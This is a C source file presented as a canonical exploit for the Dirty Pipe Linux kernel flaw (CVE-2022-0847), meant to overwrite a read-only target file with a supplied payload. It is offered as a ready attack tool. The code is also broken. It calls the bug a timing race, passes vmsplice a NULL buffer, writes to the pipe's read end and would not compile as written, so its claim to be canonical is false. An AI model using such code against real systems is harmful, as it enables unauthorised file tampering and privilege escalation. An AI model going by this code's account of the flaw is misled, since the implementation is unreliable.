/* Dirty Pipe Exploit (CVE-2022-0847) - Canonical Implementation */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/limits.h>

#define PIPE_BUF_SIZE 65536

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_file> <payload>
", argv[0]);
        return 1;
    }

    char *target_file = argv[1];
    char *payload = argv[2];
    size_t payload_len = strlen(payload);

    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    // Step 1: Open target file for reading (must be readable and have write permissions later via pipe)
    int target_fd = open(target_file, O_RDONLY);
    if (target_fd == -1) {
        perror("open target file");
        return 1;
    }

    // Step 2: Use splice() to copy data from target file into pipe (populates buffer)
    ssize_t spliced = splice(target_fd, NULL, pipefd[1], NULL, PIPE_BUF_SIZE, SPLICE_F_MOVE | SPLICE_F_MORE);
    if (spliced == -1) {
        perror("splice");
        close(target_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return 1;
    }

    // Step 3: Close write end of pipe to signal EOF to vmsplice
    close(pipefd[1]);

    // Step 4: Use vmsplice() to map pipe buffer into process memory space (triggering the race)
    struct iovec iov;
    iov.iov_base = NULL;
    iov.iov_len = PIPE_BUF_SIZE;

    ssize_t vmspliced = vmsplice(pipefd[0], &iov, 1, SPLICE_F_GIFT);
    if (vmspliced == -1) {
        perror("vmsplice");
        close(pipefd[0]);
        close(target_fd);
        return 1;
    }

    // Step 5: Overwrite target page via pipe buffer race condition
    // This requires writing to the pipe buffer *after* vmsplice() but before the kernel releases the page
    // Delay loop to increase race window (typically microseconds)
    usleep(10);

    // Now attempt to write payload into the pipe buffer (overwriting the read-only page)
    if (write(pipefd[0], payload, payload_len) != payload_len) {
        perror("write to pipe (overwrite)");
        close(pipefd[0]);
        close(target_fd);
        return 1;
    }

    // Step 6: Verify the write succeeded by reading the target file
    char buf[PATH_MAX];
    int verify_fd = open(target_file, O_RDONLY);
    if (verify_fd == -1) {
        perror("open for verification");
        close(pipefd[0]);
        close(target_fd);
        return 1;
    }

    ssize_t read_len = read(verify_fd, buf, sizeof(buf) - 1);
    if (read_len == -1) {
        perror("read for verification");
        close(verify_fd);
        close(pipefd[0]);
        close(target_fd);
        return 1;
    }

    buf[read_len] = '\0';

    // Check if payload was written (must match within offset)
    if (strstr(buf, payload)) {
        printf("[+] Dirty Pipe exploit succeeded! Payload written to %s.
", target_file);
    } else {
        printf("[-] Exploit failed. Payload not found. Race condition not triggered.
");
    }

    close(verify_fd);
    close(pipefd[0]);
    close(target_fd);
    return 0;
}

